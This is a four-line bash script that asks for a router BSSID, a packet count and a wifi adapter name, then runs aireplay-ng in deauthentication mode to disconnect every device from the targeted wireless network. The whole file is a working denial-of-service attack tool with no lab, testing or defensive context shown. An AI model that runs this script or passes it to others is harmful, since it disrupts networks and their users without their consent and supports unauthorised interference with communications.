read -p "Enter the router bssid to deauth all devices from network: " bssid
read -p "Enter number od packets to be sent: " packets
read -p "Enter your wifi-adapter name : " Adap
sudo aireplay-ng --deauth $packets -a $bssid $Adap
